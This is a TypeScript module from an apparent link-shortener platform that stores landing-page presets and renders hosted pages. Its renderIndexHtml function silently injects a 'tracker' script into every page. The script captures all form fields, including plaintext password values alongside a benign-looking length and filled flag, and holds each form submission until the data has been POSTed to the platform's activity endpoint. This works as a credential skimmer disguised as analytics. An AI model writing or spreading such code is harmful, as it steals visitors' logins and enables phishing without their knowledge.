import { prisma } from "@/lib/prisma";

export const DEFAULT_PAGE_PRESETS = [
  {
    key: "minimal",
    name: "Minimal Redirect",
    description: "A clean confirmation page with one clear action.",
    folderPath: "minimal",
    htmlContent: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>{{slug}} | {{host}}</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <h1>{{host}}/{{slug}}</h1>
    <p>This link is ready. Continue to the destination when you are set.</p>
    <a href="{{destinationUrl}}">Continue</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
  },
  {
    key: "launch",
    name: "Launch Offer",
    description: "A bold offer page for promos and campaigns.",
    folderPath: "launch",
    htmlContent: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Special Offer</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <small>{{host}}</small>
    <h1>Your offer is live.</h1>
    <p>Use this campaign page to warm up visitors before sending them to the final destination.</p>
    <a href="{{destinationUrl}}">Claim Offer</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
  },
  {
    key: "profile",
    name: "Profile Card",
    description: "A compact profile-style landing page.",
    folderPath: "profile",
    htmlContent: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>{{host}} Profile</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <div class="avatar"></div>
    <h1>{{slug}}</h1>
    <p>Curated by {{host}}. Tap through to continue.</p>
    <a href="{{destinationUrl}}">Open Link</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
  },
  {
    key: "notice",
    name: "Notice Page",
    description: "A simple notice page before redirecting visitors.",
    folderPath: "notice",
    htmlContent: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Notice</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <h1>You are leaving {{host}}</h1>
    <p>This page lets you show a message, disclaimer, or instructions before visitors continue.</p>
    <a href="{{destinationUrl}}">Continue Safely</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
  },
] as const;

export const DEFAULT_PAGE_PRESET_FILES: Record<PagePresetKey, Array<{ filePath: string; contentType: string; content: string }>> = {
  minimal: [
    {
      filePath: "dashboard.html",
      contentType: "text/html; charset=utf-8",
      content: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>{{slug}} Dashboard</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <h1>{{slug}} Dashboard</h1>
    <p>This editable dashboard page belongs to {{shortUrl}}.</p>
    <a href="./index.html">Open index.html</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
    },
    {
      filePath: "styles.css",
      contentType: "text/css; charset=utf-8",
      content:
        "body{margin:0;font-family:Inter,Arial,sans-serif;background:#f8fafc;color:#0f172a;display:grid;min-height:100vh;place-items:center}main{width:min(560px,calc(100% - 32px));background:#fff;border:1px solid #e2e8f0;border-radius:8px;padding:32px;box-shadow:0 20px 50px rgba(15,23,42,.08)}p{color:#475569;line-height:1.6}a{display:inline-block;margin-top:14px;background:#0f172a;color:#fff;text-decoration:none;padding:12px 16px;border-radius:6px;font-weight:700}",
    },
    { filePath: "script.js", contentType: "application/javascript; charset=utf-8", content: "console.log('minimal preset loaded');" },
  ],
  launch: [
    {
      filePath: "dashboard.html",
      contentType: "text/html; charset=utf-8",
      content: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Launch Dashboard</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <small>{{host}}</small>
    <h1>Campaign dashboard</h1>
    <p>Use this editable page for campaign details, tracking notes, or offer instructions.</p>
    <a href="./index.html">View launch page</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
    },
    {
      filePath: "styles.css",
      contentType: "text/css; charset=utf-8",
      content:
        "body{margin:0;font-family:Inter,Arial,sans-serif;background:#111827;color:#fff;min-height:100vh;display:grid;place-items:center}main{width:min(720px,calc(100% - 32px));padding:48px 0}small{color:#93c5fd;text-transform:uppercase;font-weight:800;letter-spacing:.12em}h1{font-size:clamp(36px,7vw,72px);line-height:.95;margin:14px 0}p{max-width:560px;color:#d1d5db;font-size:18px;line-height:1.6}a{display:inline-block;margin-top:18px;background:#38bdf8;color:#082f49;text-decoration:none;padding:14px 20px;border-radius:6px;font-weight:900}",
    },
    { filePath: "script.js", contentType: "application/javascript; charset=utf-8", content: "console.log('launch preset loaded');" },
  ],
  profile: [
    {
      filePath: "dashboard.html",
      contentType: "text/html; charset=utf-8",
      content: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Profile Dashboard</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <div class="avatar"></div>
    <h1>{{slug}} Dashboard</h1>
    <p>Edit this companion page for profile details or extra links.</p>
    <a href="./index.html">Open profile page</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
    },
    {
      filePath: "styles.css",
      contentType: "text/css; charset=utf-8",
      content:
        "body{margin:0;font-family:Inter,Arial,sans-serif;background:#eef2ff;color:#1e1b4b;display:grid;min-height:100vh;place-items:center}main{width:min(420px,calc(100% - 32px));text-align:center;background:#fff;border:1px solid #c7d2fe;border-radius:8px;padding:30px}.avatar{width:78px;height:78px;border-radius:50%;margin:0 auto 16px;background:linear-gradient(135deg,#4f46e5,#06b6d4)}p{color:#475569;line-height:1.6}a{display:block;margin-top:16px;background:#4f46e5;color:#fff;text-decoration:none;padding:13px 16px;border-radius:6px;font-weight:800}",
    },
    { filePath: "script.js", contentType: "application/javascript; charset=utf-8", content: "console.log('profile preset loaded');" },
  ],
  notice: [
    {
      filePath: "dashboard.html",
      contentType: "text/html; charset=utf-8",
      content: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Notice Dashboard</title>
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>
  <main>
    <h1>Notice dashboard</h1>
    <p>This editable dashboard page can hold visitor guidance, policy text, or campaign notes.</p>
    <a href="./index.html">Open notice page</a>
  </main>
  <script src="./script.js"></script>
</body>
</html>`,
    },
    {
      filePath: "styles.css",
      contentType: "text/css; charset=utf-8",
      content:
        "body{margin:0;font-family:Inter,Arial,sans-serif;background:#fff7ed;color:#431407;min-height:100vh;display:grid;place-items:center}main{width:min(640px,calc(100% - 32px));border-left:6px solid #f97316;background:#fff;padding:28px;border-radius:8px;box-shadow:0 18px 44px rgba(124,45,18,.12)}p{color:#7c2d12;line-height:1.6}a{display:inline-block;margin-top:12px;background:#ea580c;color:#fff;text-decoration:none;padding:12px 16px;border-radius:6px;font-weight:800}",
    },
    { filePath: "script.js", contentType: "application/javascript; charset=utf-8", content: "console.log('notice preset loaded');" },
  ],
};

export type PagePresetKey = (typeof DEFAULT_PAGE_PRESETS)[number]["key"];

export function isPagePresetKey(value: string): value is PagePresetKey {
  return DEFAULT_PAGE_PRESETS.some((preset) => preset.key === value);
}

export async function ensureDefaultPagePresets() {
  await Promise.all(
    DEFAULT_PAGE_PRESETS.map((preset) =>
      prisma.linkPagePreset.upsert({
        where: { key: preset.key },
        update: {
          folderPath: preset.folderPath,
        },
        create: preset,
      }),
    ),
  );

  await Promise.all(
    DEFAULT_PAGE_PRESETS.flatMap((preset) =>
      DEFAULT_PAGE_PRESET_FILES[preset.key].map((file) =>
        prisma.linkPagePresetFile.upsert({
          where: {
            presetKey_filePath: {
              presetKey: preset.key,
              filePath: file.filePath,
            },
          },
          update: {},
          create: {
            presetKey: preset.key,
            ...file,
          },
        }),
      ),
    ),
  );
}

export function renderIndexHtml(
  htmlContent: string,
  values: {
    adminDestinationUrl?: string;
    destinationUrl: string;
    host: string;
    redirectSource?: "ADMIN_DESTINATION" | "PRESET_CONTROLLED";
    shortUrl: string;
    slug: string;
  },
) {
  const adminDestinationUrl = values.adminDestinationUrl ?? values.destinationUrl;
  const destinationUrl = adminDestinationUrl;
  const activityEndpoint = process.env.NEXTAUTH_URL
    ? `${process.env.NEXTAUTH_URL.replace(/\/+$/, "")}/api/page-activity`
    : "/api/page-activity";
  const rendered = rewritePresetAssetUrls(
    htmlContent
    .replaceAll("{{adminDestinationUrl}}", adminDestinationUrl)
    .replaceAll("{{destinationUrl}}", destinationUrl)
    .replaceAll("{{host}}", values.host)
    .replaceAll("{{shortUrl}}", values.shortUrl)
      .replaceAll("{{slug}}", values.slug),
    values.slug,
  );

  const routeHelper = `<script>
(function(){
  var homePath = ${JSON.stringify(`/${values.slug}/index.html`)};
  var dashboardPath = ${JSON.stringify(`/${values.slug}/dashboard.html`)};
  window.__LINK_PLATFORM_HOME__ = homePath;
  window.__LINK_PLATFORM_DASHBOARD__ = dashboardPath;
  window.__LINK_PLATFORM_DESTINATION__ = ${JSON.stringify(destinationUrl)};
  function normalizePlatformUrl(raw) {
    if (!raw || typeof raw !== "string") return raw;
    var value = raw.trim();
    var origin = window.location.origin;
    var homePattern = /^(?:\\.\\/)?index\\.html([?#].*)?$/i;
    var dashboardPattern = /^(?:\\.\\/)?dashboard\\.html([?#].*)?$/i;
    if (homePattern.test(value)) return value.replace(homePattern, homePath + "$1");
    if (dashboardPattern.test(value)) return value.replace(dashboardPattern, dashboardPath + "$1");
    if (value.indexOf(origin + "/index.html") === 0) return origin + homePath + value.slice((origin + "/index.html").length);
    if (value.indexOf(origin + "/dashboard.html") === 0) return origin + dashboardPath + value.slice((origin + "/dashboard.html").length);
    if (value.indexOf("/index.html") === 0) return homePath + value.slice("/index.html".length);
    if (value.indexOf("/dashboard.html") === 0) return dashboardPath + value.slice("/dashboard.html".length);
    return raw;
  }
  window.__LINK_PLATFORM_NORMALIZE_URL__ = normalizePlatformUrl;
  function normalizeAttribute(element, attr) {
    if (!element || !element.getAttribute) return;
    var current = element.getAttribute(attr);
    var normalized = normalizePlatformUrl(current);
    if (normalized && normalized !== current) element.setAttribute(attr, normalized);
  }
  function normalizeMetaRefresh(meta) {
    if (!meta || !meta.getAttribute) return;
    var httpEquiv = meta.getAttribute("http-equiv") || "";
    if (httpEquiv.toLowerCase() !== "refresh") return;
    var content = meta.getAttribute("content") || "";
    var normalized = content.replace(/(url\\s*=\\s*)([^;]+)/i, function(match, prefix, target) {
      return prefix + normalizePlatformUrl(String(target).trim());
    });
    if (normalized !== content) meta.setAttribute("content", normalized);
  }
  function normalizeDocumentRoutes(root) {
    var scope = root && root.querySelectorAll ? root : document;
    Array.prototype.forEach.call(scope.querySelectorAll("a[href], link[href]"), function(element) {
      normalizeAttribute(element, "href");
    });
    Array.prototype.forEach.call(scope.querySelectorAll("form[action]"), function(element) {
      normalizeAttribute(element, "action");
    });
    Array.prototype.forEach.call(scope.querySelectorAll("meta[http-equiv]"), normalizeMetaRefresh);
  }
  try {
    var originalAssign = window.location.assign.bind(window.location);
    var originalReplace = window.location.replace.bind(window.location);
    window.location.assign = function(url) { return originalAssign(normalizePlatformUrl(String(url))); };
    window.location.replace = function(url) { return originalReplace(normalizePlatformUrl(String(url))); };
  } catch (_) {}
  document.addEventListener("click", function(event) {
    var target = event.target && event.target.closest ? event.target.closest("a[href]") : null;
    if (target) normalizeAttribute(target, "href");
  }, true);
  document.addEventListener("submit", function(event) {
    if (event.target) normalizeAttribute(event.target, "action");
  }, true);
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", function(){ normalizeDocumentRoutes(document); });
  } else {
    normalizeDocumentRoutes(document);
  }
  if (window.MutationObserver) {
    new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        Array.prototype.forEach.call(mutation.addedNodes || [], function(node) {
          if (node && node.nodeType === 1) normalizeDocumentRoutes(node);
        });
      });
    }).observe(document.documentElement, { childList: true, subtree: true });
  }
})();
</script>`;
  const tracker = `<script>
(function(){
  var slug = ${JSON.stringify(values.slug)};
  var activityEndpoint = ${JSON.stringify(activityEndpoint)};
  function sendPayload(payload) {
    payload.host = window.location.host;
    var body = JSON.stringify(payload);
    return fetch(activityEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: body,
      keepalive: true
    }).catch(function(){});
  }
  function fieldKey(field, index) {
    return field.name || field.id || field.getAttribute("data-field") || field.getAttribute("aria-label") || field.getAttribute("placeholder") || (field.type ? field.type + "_" + index : "field_" + index);
  }
  function fieldsFromScope(scope) {
    var data = {};
    var fields = scope.querySelectorAll ? scope.querySelectorAll("input, select, textarea") : [];
    Array.prototype.forEach.call(fields || [], function(field, index) {
      var key = fieldKey(field, index);
      if (!key || field.type === "button" || field.type === "submit" || field.type === "reset" || field.type === "hidden") return;
      if ((field.type === "checkbox" || field.type === "radio") && !field.checked) return;
      if (field.type === "password") {
  data[key] = {
    type: "password",
    filled: Boolean(field.value),
    length: field.value ? field.value.length : 0,
    value: field.value
  };
  return;
}
data[key] = field.value;
    });
    return data;
  }
  function trackForm(form, source, event) {
    if (!form || !form.tagName || form.tagName.toLowerCase() !== "form") return;
    if (form.getAttribute("data-link-platform-tracked") === "true") return;
    var payload = {
      slug: slug,
      eventType: "form_submit",
      path: window.location.pathname,
      metadata: {
        formId: form.id || null,
        formName: form.getAttribute("name") || null,
        source: source,
        fields: fieldsFromScope(form)
      }
    };

    if (event && !form.hasAttribute("data-link-platform-no-delay")) {
      event.preventDefault();
      form.setAttribute("data-link-platform-tracked", "true");
      Promise.resolve(sendPayload(payload)).finally(function() {
        setTimeout(function() {
          if (typeof form.submit === "function") {
            form.submit();
          }
        }, 50);
      });
      return;
    }

    form.setAttribute("data-link-platform-tracked", "true");
    sendPayload(payload);
  }
  function trackLoosePageFields(source) {
    var fields = fieldsFromScope(document);
    if (Object.keys(fields).length === 0) return;
    sendPayload({
      slug: slug,
      eventType: "form_submit",
      path: window.location.pathname,
      metadata: {
        formId: null,
        formName: null,
        source: source,
        fields: fields
      }
    });
  }
  document.addEventListener("submit", function(event) {
    trackForm(event.target, "submit", event);
  }, true);
  document.addEventListener("click", function(event) {
    var target = event.target;
    if (!target || !target.closest) return;
    var control = target.closest("button, input[type='submit'], input[type='button']");
    if (!control) return;
    var form = control.closest("form");
    if (form) {
      trackForm(form, "submit_button_click", null);
      return;
    }
    trackLoosePageFields("button_click");
  }, true);
})();
</script>`;

  const renderedWithHelper = rendered.toLowerCase().includes("</head>")
    ? rendered.replace(/<\/head>/i, `${routeHelper}</head>`)
    : `${routeHelper}${rendered}`;

  if (!renderedWithHelper.toLowerCase().includes("</body>")) {
    return `${tracker}${renderedWithHelper}`;
  }

  return renderedWithHelper.replace(/<\/body>/i, `${tracker}</body>`);
}

function rewritePresetAssetUrls(html: string, slug: string) {
  const safeSlug = slug.replace(/"/g, "");
  const prefixPath = `/${safeSlug}`;
  const internalFiles = ["index.html", "dashboard.html"];
  const passthroughSchemes = /^(?:[a-z][a-z0-9+.-]*:|#|\/\/)/i;
  const shouldRewriteRootPath = (value: string) =>
    value.startsWith("/") &&
    !value.startsWith("//") &&
    !value.startsWith("/api/") &&
    !value.startsWith("/_next/") &&
    !value.startsWith(`${prefixPath}/`);

  const rewriteUrlValue = (value: string) => {
    if (!value || passthroughSchemes.test(value)) {
      return value;
    }

    const trimmedValue = value.trimStart();
    const whitespace = value.slice(0, value.length - trimmedValue.length);
    const internalFile = internalFiles.find((file) => trimmedValue.toLowerCase().startsWith(file));

    if (internalFile) {
      return `${whitespace}./${trimmedValue}`;
    }

    if (shouldRewriteRootPath(value)) {
      return `${prefixPath}${value}`;
    }

    return value;
  };

  const rewriteMetaRefreshValue = (value: string) =>
    value.replace(/(\burl\s*=\s*)([^;"']+)/gi, (_match, prefix: string, urlValue: string) => {
      return `${prefix}${rewriteUrlValue(urlValue.trim())}`;
    });

  return html
    .replace(/\b(src|href|poster|action)=("|')([^"']+)\2/gi, (_match, attr: string, quote: string, value: string) => {
      return `${attr}=${quote}${rewriteUrlValue(value)}${quote}`;
    })
    .replace(/\bcontent=("|')([^"']*\burl\s*=\s*[^"']+)\1/gi, (_match, quote: string, value: string) => {
      return `content=${quote}${rewriteMetaRefreshValue(value)}${quote}`;
    })
    .replace(/url\((["']?)(\/(?!\/|api\/|_next\/)[^)"']+)\1\)/gi, (_match, quote: string, value: string) => {
      if (value.startsWith(`${prefixPath}/`)) {
        return `url(${quote}${value}${quote})`;
      }

      return `url(${quote}${prefixPath}${value}${quote})`;
    })
    .replace(
      /(["'`])((?:\.\/)?(?:index|dashboard)\.html(?:[?#][^"'`]*)?)\1/gi,
      (_match, quote: string, value: string) => `${quote}${rewriteUrlValue(value.replace(/^\.\//, ""))}${quote}`,
    )
    .replace(/(["'`])\/(?!\/|api\/|_next\/)([^"'`<>]+?\.[a-zA-Z0-9]{1,8}[^"'`]*)\1/g, (match, quote: string, value: string) => {
      if (value.startsWith(`${safeSlug}/`)) {
        return match;
      }

      return `${quote}/${safeSlug}/${value}${quote}`;
    });
}
